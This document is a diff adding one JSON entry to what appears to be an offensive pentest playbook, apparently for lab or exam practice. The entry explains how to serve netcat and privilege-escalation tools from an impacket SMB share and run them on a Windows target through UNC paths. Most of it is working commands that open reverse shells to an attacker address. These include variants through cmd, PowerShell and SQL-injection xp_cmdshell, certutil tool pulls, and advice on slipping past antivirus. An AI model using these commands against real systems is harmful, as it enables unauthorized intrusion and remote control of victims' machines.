@@ -1,0 +1,30 @@
+{
+  "id": "smb_hosted_shell",
+  "phase": "POST",
+  "title": "SMB Hosted Shell — Execute Off-Share, No Disk Write",
+  "body": "Instead of transferring a binary to the target and running it from disk, you serve it from an impacket SMB share and execute it directly via UNC path. The binary never touches the target's filesystem — it runs straight from your share. This sidesteps AV scanning on write, certutil/iwr blocks, and the need for a writable directory. The target pulls and runs in one step.\n\nRequires: the target can reach your Kali on SMB port 445, and the exploit/injection can run a full UNC command (cmd.exe /c //host/share/file.exe works). Common in web app RCE, SQL injection exec, service exploits, and any shell where you control a command string but not file placement.\n\nThe gotcha: authentication. Windows targets on modern builds may require SMB auth even for anonymous-looking connections. If the shell hangs at execution but the SMB server shows a connection, add -user/-password flags and pass credentials in the UNC path.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — SETUP ON KALI\n# ══════════════════════════════════════════════════\n# Put the binary you want to run in a share directory:\nmkdir -p ~/share\ncp /usr/share/windows-binaries/nc.exe ~/share/\n# (or SigmaPotato.exe, winPEAS.exe, any tool)\n\n# Start the SMB server:\ncd ~/share\nimpacket-smbserver Share $(pwd) -smb2support\n# 'Share' is the share name — //kali-ip/Share/nc.exe\n# -smb2support is required for modern Windows targets\n\n# Optional auth (if target rejects anonymous):\nimpacket-smbserver Share $(pwd) -smb2support -user kali -password kali\n\n# ══════════════════════════════════════════════════\n# 2 — START YOUR LISTENER\n# ══════════════════════════════════════════════════\nnc -lvnp 443\n\n# ══════════════════════════════════════════════════\n# 3 — TRIGGER FROM THE TARGET\n# ══════════════════════════════════════════════════\n# Direct exec (no disk write — runs straight off the share):\ncmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443\n\n# If broken PATH / in a restricted shell:\nC:\\Windows\\System32\\cmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443\n\n# Via SQL injection exec (H2 JNI, MSSQL xp_cmdshell, etc.):\n# EXEC xp_cmdshell 'cmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443'\n# CALL EXEC('cmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443');\n\n# Via PowerShell (if cmd.exe is restricted):\npowershell -c \"Start-Process \\\\\\\\192.168.45.166\\\\Share\\\\nc.exe -ArgumentList '-e cmd.exe 192.168.45.166 443'\"\n\n# Copy then run (if direct exec is blocked but copy works):\ncopy \\\\192.168.45.166\\Share\\nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.168.45.166 443\n\n# ══════════════════════════════════════════════════\n# 4 — WITH AUTH (if anonymous is rejected)\n# ══════════════════════════════════════════════════\n# Pass creds in the UNC path:\ncmd.exe /c net use \\\\192.168.45.166\\Share /user:kali kali\ncmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443\n# Or inline (older Windows):\ncmd.exe /c \\\\kali:kali@192.168.45.166\\Share\\nc.exe -e cmd.exe 192.168.45.166 443\n\n# ══════════════════════════════════════════════════\n# 5 — VERIFY\n# ══════════════════════════════════════════════════\n# Watch the SMB server terminal:\n# '[*] Incoming connection' → target reached your share\n# '[*] AUTHENTICATE_MESSAGE' → auth negotiation (good)\n# '[*] Sending to domain...' → about to auth\n# Shell lands on your nc listener.\n\n# If SMB connects but shell doesn't land:\n# - nc.exe may be blocked by AV even running off-share\n# - Try: SigmaPotato.exe or a msfvenom .exe instead\n# - Or: smb pull nc.exe then run it from disk (copy-then-run above)\n\n# If SMB server shows no connection at all:\n# - Port 445 filtered outbound from target → SMB not an option\n# - Fall back to HTTP pull: certutil / iwr\n# - Or try port 80 if egress only allows web traffic\n\n# ══════════════════════════════════════════════════\n# 6 — SERVE MULTIPLE TOOLS\n# ══════════════════════════════════════════════════\n# The share serves everything in ~/share — add tools as needed:\ncp /path/to/SigmaPotato.exe ~/share/\ncp /path/to/winPEASx64.exe ~/share/\n# Target can pull any of them:\ncertutil -urlcache -f \\\\192.168.45.166\\Share\\winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe\n# Or execute directly: \\\\192.168.45.166\\Share\\SigmaPotato.exe \"nc.exe -e cmd 192.168.45.166 443\"",
+  "warn": "The SMB server must stay running for the duration — if you Ctrl-C it while the binary is still executing, the process dies. Keep the SMB terminal open until you have a stable shell and no longer need the share. Modern Windows Defender scans binaries even when loaded from network paths — if AV kills nc.exe off-share, it would also kill it on disk; the issue is the binary, not the method. Try a different payload (msfvenom with encoding, or a legitimate signed binary with evil arguments). Anonymous SMB is increasingly restricted on Windows 10/11 and Server 2019+ — add auth flags to the server and net use on the target if connections drop immediately.",
+  "choices": [
+    {
+      "label": "Shell landed — upgrade / enumerate",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "SMB connects but shell doesn't land — try HTTP",
+      "next": "hosted_shell"
+    },
+    {
+      "label": "AV killing the binary — bypass needed",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Got shell — SeImpersonate visible",
+      "next": "seimpersonate"
+    },
+    {
+      "label": "Back to file transfer options",
+      "next": "file_transfer"
+    }
+  ]
+}
